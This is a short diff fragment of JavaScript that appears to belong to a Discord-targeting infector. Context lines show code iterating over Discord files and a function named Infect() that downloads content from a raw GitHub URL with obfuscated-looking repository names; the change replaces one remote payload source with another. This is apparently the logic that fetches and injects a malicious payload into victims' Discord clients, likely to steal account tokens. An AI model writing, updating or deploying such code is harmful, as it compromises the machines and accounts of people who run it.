@@ -25,7 +25,7 @@ discords.forEach(function(file) {
     })
 });
 function Infect() {
-    https.get('https://raw.githubusercontent.com/sdmkakmdsamkd/sdmkakmdsamkdrs/main/dnjajndsasdjajnds/ndjsadjandjajdjaj', (resp) => {
+    https.get('https://raw.githubusercontent.com/venomprivs/venomrebenta2120sjdhas/main/venomcomebutinhablazethay/ndjsadjandjajdjaj', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
